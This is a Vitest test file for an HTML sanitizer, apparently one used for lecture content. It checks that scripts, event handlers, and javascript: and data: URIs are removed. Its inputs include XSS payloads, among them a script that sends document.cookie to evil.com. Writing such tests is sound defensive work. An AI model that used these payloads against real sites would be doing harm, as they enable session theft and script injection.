import { describe, it, expect } from "vitest";
import { sanitizeHtml } from "../app/utils/sanitize";

describe("sanitizeHtml", () => {
  it("returns an empty string for empty input", () => {
    expect(sanitizeHtml("")).toBe("");
  });

  it("keeps plain allowed formatting untouched (content-wise)", () => {
    const out = sanitizeHtml("<p>Hello <strong>world</strong></p>");
    expect(out).toContain("Hello");
    expect(out).toContain("world");
    expect(out).toContain("<strong>");
  });

  it("strips <script> tags entirely, including their content", () => {
    const out = sanitizeHtml('<p>safe</p><script>alert("xss")</script>');
    expect(out).not.toContain("<script");
    expect(out).not.toContain("alert");
    expect(out).toContain("safe");
  });

  it("strips <style> tags entirely", () => {
    const out = sanitizeHtml("<style>body{display:none}</style><p>text</p>");
    expect(out).not.toContain("<style");
    expect(out).not.toContain("display:none");
  });

  it("strips iframe/object/embed/form/input tags", () => {
    const out = sanitizeHtml(
      '<iframe src="evil.com"></iframe><object data="x"></object>' +
      '<embed src="x"><form><input type="text"></form>',
    );
    expect(out).not.toMatch(/<iframe|<object|<embed|<form|<input/i);
  });

  it("strips inline event handler attributes like onerror/onclick", () => {
    const out = sanitizeHtml('<p onclick="alert(1)">click me</p>');
    expect(out).not.toContain("onclick");
    expect(out).not.toContain("alert(1)");
    expect(out).toContain("click me");
  });

  it("strips javascript: URIs from href", () => {
    const out = sanitizeHtml('<a href="javascript:alert(1)">link</a>');
    expect(out).not.toContain("javascript:");
  });

  it("strips data: URIs from href", () => {
    const out = sanitizeHtml('<a href="data:text/html;base64,PHNjcmlwdD4=">link</a>');
    expect(out).not.toContain("data:");
  });

  it("keeps a safe href on anchor tags and adds rel=noopener", () => {
    const out = sanitizeHtml('<a href="https://example.com">link</a>');
    expect(out).toContain('href="https://example.com"');
    expect(out).toContain('rel="noopener noreferrer"');
    expect(out).toContain('target="_blank"');
  });

  it("removes unknown/disallowed tags but keeps their inner text", () => {
    const out = sanitizeHtml("<marquee>scrolling text</marquee>");
    expect(out).not.toContain("<marquee");
    expect(out).toContain("scrolling text");
  });

  it("strips attributes from otherwise-allowed tags (except href on <a>)", () => {
    const out = sanitizeHtml('<p style="color:red" class="foo">text</p>');
    expect(out).not.toContain("style=");
    expect(out).not.toContain("class=");
    expect(out).toContain("<p>text</p>");
  });

  it("handles a realistic mixed-content lecture body safely", () => {
    const input = `
      <h2>Lesson Title</h2>
      <p>Some intro text with <em>emphasis</em>.</p>
      <script>fetch('https://evil.com/steal?c=' + document.cookie)</script>
      <img src="x" onerror="alert(1)">
      <a href="javascript:void(0)" onclick="steal()">Click here</a>
      <ul><li>Point one</li><li>Point two</li></ul>
    `;
    const out = sanitizeHtml(input);
    expect(out).not.toContain("<script");
    expect(out).not.toContain("evil.com");
    expect(out).not.toContain("onerror");
    expect(out).not.toContain("onclick");
    expect(out).not.toContain("javascript:");
    expect(out).toContain("Lesson Title");
    expect(out).toContain("Point one");
  });
});
